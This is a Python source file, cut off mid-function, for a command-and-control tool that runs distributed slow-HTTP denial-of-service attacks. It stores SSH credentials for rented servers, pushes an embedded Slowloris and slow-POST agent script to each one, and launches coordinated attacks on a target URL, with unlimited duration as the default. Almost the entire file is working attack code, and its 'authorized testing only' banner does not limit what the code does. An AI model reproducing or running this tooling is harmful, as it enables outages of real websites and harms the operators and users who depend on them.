#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Terminal UI Version
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import paramiko
import threading
import json
import time
import os
import sys
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
from cryptography.fernet import Fernet
import subprocess
import socket
import random
import string

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class SecurityManager:
    def __init__(self):
        if os.path.exists('key.key'):
            with open('key.key', 'rb') as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open('key.key', 'wb') as f:
                f.write(self.key)
        self.cipher = Fernet(self.key)
    
    def encrypt_password(self, password):
        return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
    
    def decrypt_password(self, encrypted_password):
        return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()

class DatabaseManager:
    def __init__(self):
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect('c2_database.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vps_nodes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL UNIQUE,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ssh_port INTEGER DEFAULT 22,
                status TEXT DEFAULT 'offline',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                location TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_name TEXT NOT NULL,
                target_url TEXT NOT NULL,
                attack_type TEXT NOT NULL,
                vps_nodes TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                status TEXT DEFAULT 'pending',
                parameters TEXT,
                results TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown"):
        conn = sqlite3.connect('c2_database.db')
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location)
                VALUES (?, ?, ?, ?, ?)
            ''', (ip, username, encrypted_password, port, location))
            conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False
        finally:
            conn.close()
    
    def get_all_vps(self):
        conn = sqlite3.connect('c2_database.db')
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM vps_nodes ORDER BY id')
        vps_list = cursor.fetchall()
        conn.close()
        return vps_list
    
    def update_vps_status(self, ip, status):
        conn = sqlite3.connect('c2_database.db')
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE vps_nodes SET status = ?, last_seen = ? WHERE ip_address = ?
        ''', (status, datetime.now(), ip))
        conn.commit()
        conn.close()
    
    def remove_vps(self, ip):
        conn = sqlite3.connect('c2_database.db')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM vps_nodes WHERE ip_address = ?', (ip,))
        conn.commit()
        conn.close()
    
    def create_attack_session(self, session_name, target_url, attack_type, vps_nodes, parameters):
        conn = sqlite3.connect('c2_database.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO attack_sessions (session_name, target_url, attack_type, vps_nodes, parameters, start_time, status)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (session_name, target_url, attack_type, json.dumps(vps_nodes), json.dumps(parameters), datetime.now(), 'running'))
        
        session_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return session_id

class SSHManager:
    def __init__(self, security_manager):
        self.connections = {}
        self.security_manager = security_manager
    
    def connect_vps(self, ip, username, encrypted_password, port=22):
        try:
            password = self.security_manager.decrypt_password(encrypted_password)
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=ip,
                username=username,
                password=password,
                port=port,
                timeout=10
            )
            
            self.connections[ip] = ssh
            return True, "Connected successfully"
            
        except Exception as e:
            return False, str(e)
    
    def execute_command(self, ip, command):
        if ip not in self.connections:
            return False, "No connection to VPS"
        
        try:
            stdin, stdout, stderr = self.connections[ip].exec_command(command)
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            if error and "warning" not in error.lower():
                return False, error
            return True, output
            
        except Exception as e:
            return False, str(e)
    
    def deploy_agent(self, ip):
        """Deploy slow HTTP attack agent to VPS"""
        agent_script = '''#!/usr/bin/env python3
import socket
import threading
import time
import sys
import random
import string
import signal

class SlowHTTPAttack:
    def __init__(self, target_host, target_port=80):
        self.target_host = target_host
        self.target_port = target_port
        self.connections = []
        self.running = False
        self.stats = {'total_sent': 0, 'active_connections': 0}
    
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_host, self.target_port))
            return sock
        except:
            return None
    
    def slowloris_attack(self, num_connections=1000, delay=15, duration=0):
        print(f"[SLOWLORIS] Starting attack on {self.target_host}:{self.target_port}")
        print(f"[SLOWLORIS] Target connections: {num_connections}, Delay: {delay}s")
        if duration > 0:
            print(f"[SLOWLORIS] Duration: {duration} seconds")
        else:
            print(f"[SLOWLORIS] Duration: Unlimited (until manual stop)")
        
        self.running = True
        start_time = time.time()
        
        # Create initial connections
        for i in range(num_connections):
            if not self.running:
                break
                
            sock = self.create_socket()
            if sock:
                request = f"GET /?{random.randint(0, 50000)} HTTP/1.1\\r\\n"
                request += f"Host: {self.target_host}\\r\\n"
                request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r\\n"
                request += "Accept-language: en-US,en,q=0.5\\r\\n"
                
                try:
                    sock.send(request.encode())
                    self.connections.append(sock)
                    self.stats['total_sent'] += 1
                except:
                    sock.close()
        
        print(f"[SLOWLORIS] Created {len(self.connections)} initial connections")
        
        # Keep connections alive with random headers
        while self.running and self.connections:
            # Check if duration limit reached
            if duration > 0 and (time.time() - start_time) >= duration:
                print(f"[SLOWLORIS] Duration limit reached ({duration}s), stopping attack...")
                self.stop_attack()
                break
                
            for sock in self.connections[:]:
                try:
                    header = f"X-{''.join(random.choices(string.ascii_letters, k=8))}: {''.join(random.choices(string.ascii_letters + string.digits, k=15))}\\r\\n"
                    sock.send(header.encode())
                    self.stats['total_sent'] += 1
                except:
                    self.connections.remove(sock)
                    # Create replacement connection
                    new_sock = self.create_socket()
                    if new_sock:
                        request = f"GET /?{random.randint(0, 50000)} HTTP/1.1\\r\\n"
                        request += f"Host: {self.target_host}\\r\\n"
                        try:
                            new_sock.send(request.encode())
                            self.connections.append(new_sock)
                            self.stats['total_sent'] += 1
                        except:
                            new_sock.close()
            
            self.stats['active_connections'] = len(self.connections)
            
            # Show remaining time if duration is set
            if duration > 0:
                elapsed = time.time() - start_time
                remaining = duration - elapsed
                print(f"[SLOWLORIS] Active: {len(self.connections)} | Total packets: {self.stats['total_sent']} | Time remaining: {int(remaining)}s")
            else:
                print(f"[SLOWLORIS] Active: {len(self.connections)} | Total packets: {self.stats['total_sent']}")
            
            time.sleep(delay)
    
    def slow_post_attack(self, num_connections=500, delay=10, duration=0):
        print(f"[SLOW-POST] Starting attack on {self.target_host}:{self.target_port}")
        if duration > 0:
            print(f"[SLOW-POST] Duration: {duration} seconds")
        else:
            print(f"[SLOW-POST] Duration: Unlimited")
            
        self.running = True
        start_time = time.time()
        
        for i in range(num_connections):
            if not self.running:
                break
            
            sock = self.create_socket()
            if sock:
                post_request = f"POST /?{random.randint(0, 10000)} HTTP/1.1\\r\\n"
                post_request += f"Host: {self.target_host}\\r\\n"
                post_request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                post_request += f"Content-Length: {random.randint(1000000, 5000000)}\\r\\n\\r\\n"
                
                try:
                    sock.send(post_request.encode())
                    self.connections.append(sock)
                    self.stats['total_sent'] += 1
                except:
                    sock.close()
        
        print(f"[SLOW-POST] Created {len(self.connections)} POST connections")
        
        # Send data very slowly
        while self.running and self.connections:
            # Check duration limit
            if duration > 0 and (time.time() - start_time) >= duration:
                print(f"[SLOW-POST] Duration limit reached ({duration}s), stopping attack...")
                self.stop_attack()
                break
                
            for sock in self.connections[:]:
                try:
                    data = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1, 5)))
                    sock.send(data.encode())
                    self.stats['total_sent'] += 1
                except:
                    self.connections.remove(sock)
            
            self.stats['active_connections'] = len(self.connections)
            
            if duration > 0:
                elapsed = time.time() - start_time
                remaining = duration - elapsed
                print(f"[SLOW-POST] Active: {len(self.connections)} | Total bytes: {self.stats['total_sent']} | Time remaining: {int(remaining)}s")
            else:
                print(f"[SLOW-POST] Active: {len(self.connections)} | Total bytes: {self.stats['total_sent']}")
                
            time.sleep(delay)
    
    def stop_attack(self):
        print("[ATTACK] Stopping attack...")
        self.running = False
        for sock in self.connections:
            try:
                sock.close()
            except:
                pass
        self.connections.clear()
        print("[ATTACK] Attack stopped")

def signal_handler(sig, frame):
    print("\\n[SIGNAL] Received stop signal")
    if 'attacker' in globals():
        attacker.stop_attack()
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 agent.py <target_host> <attack_type> <connections> [delay] [duration]")
        sys.exit(1)
    
    target_host = sys.argv[1]
    attack_type = sys.argv[2]
    connections = int(sys.argv[3])
    delay = int(sys.argv[4]) if len(sys.argv) > 4 else 15
    duration = int(sys.argv[5]) if len(sys.argv) > 5 else 0  # Duration in seconds, 0 = unlimited
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    attacker = SlowHTTPAttack(target_host)
    
    try:
        if attack_type == "slowloris":
            attacker.slowloris_attack(connections, delay, duration)
        elif attack_type == "slow_post":
            attacker.slow_post_attack(connections, delay, duration)
        else:
            print(f"[ERROR] Unknown attack type: {attack_type}")
    except KeyboardInterrupt:
        attacker.stop_attack()
'''
        
        commands = [
            "mkdir -p /tmp/slowhttp_c2",
            f"cat > /tmp/slowhttp_c2/agent.py << 'EOF'\n{agent_script}\nEOF",
            "chmod +x /tmp/slowhttp_c2/agent.py",
            "which python3 > /dev/null || (apt update && apt install -y python3)"
        ]
        
        for cmd in commands:
            success, output = self.execute_command(ip, cmd)
            if not success and "apt" not in cmd:
                return False, f"Failed to deploy agent: {output}"
        
        return True, "Agent deployed successfully"

class AttackManager:
    def __init__(self, ssh_manager, db_manager):
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
        self.monitoring_active = False
    
    def launch_distributed_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        target_host = target_url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
        connections_per_vps = parameters.get('connections_per_vps', 1000)
        delay = parameters.get('delay', 15)
        
        self.active_attacks[session_id] = {
            'target': target_host,
            'type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters
        }
        
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.END}")
        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {connections_per_vps} | Delay: {delay}s{Colors.END}")
        
        def attack_worker(vps_ip):
            command = f"cd /tmp/slowhttp_c2 && nohup python3 agent.py {target_host} {attack_type} {connections_per_vps} {delay} {parameters.get('duration', 0)} > attack.log 2>&1 &"
            success, output = self.ssh_manager.execute_command(vps_ip, command)
            
            if success:
                print(f"{Colors.GREEN}[VPS] {vps_ip}: Attack launched successfully{Colors.END}")
            else:
                print(f"{Colors.RED}[VPS] {vps_ip}: Failed to launch attack - {output}{Colors.END}")
        
        with ThreadPoolExecutor(max_workers=len(vps_list)) as executor:
            executor.map(attack_worker, vps_list)
        
        # Start monitoring thread
        self.monitoring_active = True
        monitor_thread = threading.Thread(target=self._monitor_attack, args=(session_id,), daemon=True)
        monitor_thread.start()
        
        return True
    
    def _monitor_attack(self, session_id):
        while self.monitoring_active and session_id in self.active_attacks:
            status_data = self.get_attack_status(session_id)
            
            # Clear screen and show status
            os.system('clear' if os.name == 'posix' else 'cls')
            self._display_attack_status(session_id, status_data)
            
            time.sleep(5)
    
    def _display_attack_status(self, session_id, status_data):
        attack_info = self.active_attacks.get(session_id, {})
        
        print(f"{Colors.BOLD}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}     DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.END}")
        print(f"{Colors.BOLD}{'='*80}{Colors.END}")
        
        print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_info.get('type', 'Unknown').upper()}{Colors.END}")
        print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target', 'Unknown')}{Colors.END}")
        
        if attack_info.get('start_time'):
            uptime = datetime.now() - attack_info['start_time']
            print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.END}")
        
        print(f"\n{Colors.BOLD}VPS STATUS:{Colors.END}")
        print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Last Update'}")
        print("-" * 60)
        
        total_processes = 0
        active_vps = 0
        
        for vps_ip, data in status_data.items():
            processes = data.get('active_processes', 0)
            status = "ATTACKING" if processes > 0 else "IDLE"
            color = Colors.GREEN if processes > 0 else Colors.RED
            
            total_processes += processes
            if processes > 0:
                active_vps += 1
            
            print(f"{vps_ip:<15} {color}{status:<12}{Colors.END} {processes:<10} {datetime.now().strftime('%H:%M:%S')}")
        
        print(f"\n{Colors.BOLD}ATTACK STATISTICS:{Colors.END}")
        print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.END}")
        print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.END}")
        print(f"{Colors.YELLOW}Estimated Connections: {total_processes * attack_info.get('parameters', {}).get('connections_per_vps', 1000)}{Colors.END}")
        
        print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring | Type 'stop' to end attack{Colors.END}")
    
    def stop_attack(self, session_id):
        if session_id not in self.active_attacks:
            return False
        
        vps_list = self.active_attacks[session_id]['vps_list']
        
        print(f"\n{Colors.YELLOW}[ATTACK] Stopping attack on all VPS nodes...{Colors.END}")
        
        def stop_worker(vps_ip):
            commands = [
                "pkill -f 'python3 agent.py'",
                "killall python3 2>/dev/null || true"
            ]
            for cmd in commands:
                self.ssh_manager.execute_command(vps_ip, cmd)
            print(f"{Colors.GREEN}[VPS] {vps_ip}: Attack stopped{Colors.END}")
        
        with ThreadPoolExecutor(max_workers=len(vps_list)) as executor:
            executor.map(stop_worker, vps_list)
        
        self.active_attacks[session_id]['status'] = 'stopped'
        self.active_attacks[session_id]['end_time'] = datetime.now()
        self.monitoring_active = False
        
        print(f"{Colors.GREEN}[ATTACK] All attacks stopped successfully{Colors.END}")
        return True
    
    def get_attack_status(self, session_id):
        if session_id not in self.active_attacks:
            return {}
        
        vps_list = self.active_attacks[session_id]['vps_list']
        status = {}
        
        for vps_ip in vps_list:
            success, output = self.ssh_manager.execute_command(vps_ip, "ps aux | grep 'python3 agent.py' | grep -v grep | wc -l")
            if success:
                status[vps_ip] = {
                    'active_processes': int(output) if output.isdigit() else 0,
                    'status': 'attacking' if int(output or 0) > 0 else 'idle'
                }
            else:
                status[vps_ip] = {
                    'active_processes': 0,
                    'status': 'error'
                }
        
        return status

class SlowHTTPTUI:
    def __init__(self):
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.running = True
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.END}")
        self.running = False
        sys.exit(0)
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                           Terminal Interface                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.END}
{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.END}

"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.END}
{Colors.GREEN}[1]{Colors.END} VPS Management
{Colors.GREEN}[2]{Colors.END} Launch Attack
{Colors.GREEN}[3]{Colors.END} Monitor Active Attacks
{Colors.GREEN}[4]{Colors.END} Attack History
{Colors.GREEN}[5]{Colors.END} Exit

{Colors.YELLOW}Select option: {Colors.END}"""
        print(menu)
    
    def vps_management_menu(self):
        while self.running:
            self.clear_screen()
            self.print_banner()
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.END}")
            print("=" * 50)
            
            if vps_list:
                print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Location'}")
                print("-" * 70)
                
                for vps in vps_list:
                    status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
                    print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.END} {vps[8] or 'Unknown'}")
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.END}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.END}
{Colors.GREEN}[1]{Colors.END} Add VPS
{Colors.GREEN}[2]{Colors.END} Test All Connections
{Colors.GREEN}[3]{Colors.END} Deploy Agents to All
{Colors.GREEN}[4]{Colors.END} Remove VPS
{Colors.GREEN}[5]{Colors.END} Back to Main Menu

{Colors.YELLOW}Select option: {Colors.END}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.test_all_connections()
            elif choice == '3':
                self.deploy_all_agents()
            elif choice == '4':
                self.remove_vps()
            elif choice == '5':
                break
    
    def add_vps(self):
        print(f"\n{Colors.BOLD}ADD NEW VPS{Colors.END}")
        print("-" * 20)
        
        try:
            ip = input(f"{Colors.CYAN}IP Address: {Colors.END}").strip()
            username = input(f"{Colors.CYAN}SSH Username: {Colors.END}").strip()
            password = input(f"{Colors.CYAN}SSH Password: {Colors.END}").strip()
            port = input(f"{Colors.CYAN}SSH Port (default 22): {Colors.END}").strip() or "22"
            location = input(f"{Colors.CYAN}Location (optional): {Colors.END}").strip() or "Unknown"
            
            if not all([ip, username, password]):
                print(f"{Colors.RED}[ERROR] All fields are required{Colors.END}")
                input("Press Enter to continue...")
                return
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            if self.db_manager.add_vps(ip, username, encrypted_password, int(port), location):
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.END}")
                
                # Test connection
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.END}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, int(port))
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.END}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.END}")
            else:
                print(f"{Colors.RED}[ERROR] VPS already exists or database error{Colors.END}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.END}")
        
        input("Press Enter to continue...")
    
    def test_all_connections(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.END}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.END}")
        print("-" * 40)
        
        for vps in vps_list:
            ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
            print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.END} ", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
            status = 'online' if success else 'offline'
            self.db_manager.update_vps_status(ip, status)
            
            if success:
                print(f"{Colors.GREEN}ONLINE{Colors.END}")
            else:
                print(f"{Colors.RED}OFFLINE - {message}{Colors.END}")
        
        input("\nPress Enter to continue...")
    
    def deploy_all_agents(self):
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.END}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}DEPLOYING AGENTS TO ALL ONLINE VPS{Colors.END}")
        print("-" * 50)
        
        for vps in online_vps:
            ip = vps[1]
            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.END} ", end="", flush=True)
            
            success, message = self.ssh_manager.deploy_agent(ip)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.END}")
            else:
                print(f"{Colors.RED}FAILED - {message}{Colors.END}")
        
        input("\nPress Enter to continue...")
    
    def remove_vps(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.END}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}REMOVE VPS{Colors.END}")
        print("-" * 15)
        
        try:
            vps_id = input(f"{Colors.CYAN}Enter VPS ID to remove: {Colors.END}").strip()
            
            if not vps_id.isdigit():
                print(f"{Colors.RED}[ERROR] Invalid VPS ID{Colors.END}")
                input("Press Enter to continue...")
                return
            
            # Find VPS
            target_vps = None
            for vps in vps_list:
                if vps[0] == int(vps_id):
                    target_vps = vps
                    break
            
            if not target_vps:
                print(f"{Colors.RED}[ERROR] VPS ID not found{Colors.END}")
                input("Press Enter to continue...")
                return
            
            confirm = input(f"{Colors.YELLOW}Remove VPS {target_vps[1]}? (y/N): {Colors.END}").strip().lower()
            
            if confirm == 'y':
                self.db_manager.remove_vps(target_vps[1])
                print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.END}")
            else:
                print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.END}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.END}")
        
        input("Press Enter to continue...")
    
    def launch_attack_menu(self):
        self.clear_screen()
        self.print_banner()
        
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.END}")
            print(f"{Colors.YELLOW}[INFO] Please add and configure VPS nodes first{Colors.END}")
            input("Press Enter to continue...")
            return
        
        print(f"{Colors.BOLD}LAUNCH DISTRIBUTED ATTACK{Colors.END}")
        print("=" * 40)
        
        print(f"\n{Colors.GREEN}Available VPS Nodes: {len(online_vps)}{Colors.END}")
        for i, vps in enumerate(online_vps, 1):
            print(f"  {i}. {vps[1]} ({vps[8] or 'Unknown'})")
        
        try:
            print(f"\n{Colors.BOLD}ATTACK CONFIGURATION:{Colors.END}")
            
            # Target configuration
            target_url = input(f"{Colors.CYAN}Target URL (e.g., http://target.com): {Colors.END}").strip()
            if not target_url:
                print(f"{Colors.RED}[ERROR] Target URL is required{Colors.END}")
                input("Press Enter to continue...")
                return
            
            # Attack type
            print(f"\n{Colors.BOLD}Attack Types:{Colors.END}")
            print(f"{Colors.GREEN}[1]{Colors.END} Slowloris (Slow Headers)")
            print(f"{Colors.GREEN}[2]{Colors.END} Slow POST (R.U.D.Y)")
            
            attack_choice = input(f"{Colors.CYAN}Select attack type (1-2): {Colors.END}").strip()
            
            attack_types = {'1': 'slowloris', '2': 'slow_post'}
            attack_type = attack_types.get(attack_choice)
            
            if not attack_type:
                print(f"{Colors.RED}[ERROR] Invalid attack type{Colors.END}")
                input("Press Enter to continue...")
                return
            
            # VPS selection
            print(f"\n{Colors.BOLD}VPS Selection:{Colors.END}")
            print(f"{Colors.YELLOW}Enter VPS numbers to use (e.g., 1,2,3 or 'all'): {Colors.END}")
            vps_selection = input().strip()
            
            if vps_selection.lower() == 'all':
                selected_vps = [vps[1] for vps in online_vps]
            else:
                try:
                    indices = [int(x.strip()) - 1 for x in vps_selection.split(',')]
                    selected_vps = [online_vps[i][1] for i in indices if 0 <= i < len(online_vps)]
                except (ValueError, IndexError):
                    print(f"{Colors.RED}[ERROR] Invalid VPS selection{Colors.END}")
                    input("Press Enter to continue...")
                    return
            
            if not selected_vps:
                print(f"{Colors.RED}[ERROR] No VPS selected{Colors.END}")
                input("Press Enter to continue...")
                return
            
            # Attack parameters
            print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.END}")
            
            connections_input = input(f"{Colors.CYAN}Connections per VPS (default 1000): {Colors.END}").strip()
            connections_per_vps = int(connections_input) if connections_input.isdigit() else 1000
            
            delay_input = input(f"{Colors.CYAN}Delay between packets in seconds (default 15): {Colors.END}").strip()
            delay = int(delay_input) if delay_input.isdigit() else 15
            
            duration_input = input(f"{Colors.CYAN}Attack duration in seconds (0 for unlimited): {Colors.END}").strip()
            duration = int(duration_input) if duration_input.isdigit() else 0
            
            # Session name
            session_name = f"Attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            # Confirmation
            print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.END}")
            print(f"Target: {Colors.YELLOW}{target_url}{Colors.END}")
            print(f"Attack Type: {Colors.YELLOW}{attack_type.replace('_', ' ').title()}{Colors.END}")
            print(f"VPS Nodes: {Colors.YELLOW}{len(selected_vps)}{Colors.END}")
            print(f"Connections per VPS: {Colors.YELLOW}{connections_per_vps}{Colors.END}")
            print(f"Total Estimated Connections: {Colors.YELLOW}{len(selected_vps) * connections_per_vps}{Colors.END}")
            print(f"Packet Delay: {Colors.YELLOW}{delay}s{Colors.END}")
            print(f"Duration: {Colors.YELLOW}{'Unlimited' if duration == 0 else f'{duration}s'}{Colors.END}")
            
            confirm = input(f"\n{Colors.RED}Launch attack? (y/N): {Colors.END}").strip().lower()
            
            if confirm != 'y':
                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.END}")
                input("Press Enter to continue...")
                return
            
            # Launch attack
            parameters = {
                'connections_per_vps': connections_per_vps,
                'delay': delay,
                'duration': duration
            }
            
            session_id = self.db_manager.create_attack_session(
                session_name, target_url, attack_type, selected_vps, parameters
            )
            
            success = self.attack_manager.launch_distributed_attack(
                session_id, target_url, attack_type, selected_vps, parameters
            )
            
            if success:
                print(f"\n{Colors.GREEN}[SUCCESS] Attack launched successfully!{Colors.END}")
                print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.END}")
                
                # Auto-start monitoring
                input(f"\n{Colors.YELLOW}Press Enter to start monitoring...{Colors.END}")
                self.monitor_attack(session_id)
            else:
                print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.END}")
                input("Press Enter to continue...")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.END}")
            input("Press Enter to continue...")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.END}")
            input("Press Enter to continue...")
    
    def monitor_attack(self, session_id=None):
        if session_id is None:
            # List active attacks
            if not self.attack_manager.active_attacks:
                print(f"{Colors.YELLOW}[INFO] No active attacks to monitor{Colors.END}")
                input("Press Enter to continue...")
                return
            
            print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.END}")
            for sid, attack_info in self.attack_manager.active_attacks.items():
                print(f"Session {sid}: {attack_info['target']} ({attack_info['type']})")
            
            try:
                session_input = input(f"{Colors.CYAN}Enter session ID to monitor: {Colors.END}").strip()
                session_id = int(session_input)
            except (ValueError, KeyboardInterrupt):
                return
        
        if session_id not in self.attack_manager.active_attacks:
            print(f"{Colors.RED}[ERROR] Session not found{Colors.END}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time monitoring...{Colors.END}")
        print(f"{Colors.YELLOW}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.END}")
        time.sleep(2)
        
        try:
            while session_id in self.attack_manager.active_attacks:
                status_data = self.attack_manager.get_attack_status(session_id)
                attack_info = self.attack_manager.active_attacks[session_id]
                
                # Clear screen and display status
                self.clear_screen()
                
                print(f"{Colors.BOLD}{'='*80}{Colors.END}")
                print(f"{Colors.BOLD}{Colors.CYAN}     DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.END}")
                print(f"{Colors.BOLD}{'='*80}{Colors.END}")
                
                print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_info.get('type', 'Unknown').upper()}{Colors.END}")
                print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target', 'Unknown')}{Colors.END}")
                
                if attack_info.get('start_time'):
                    uptime = datetime.now() - attack_info['start_time']
                    print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.END}")
                
                print(f"\n{Colors.BOLD}VPS STATUS:{Colors.END}")
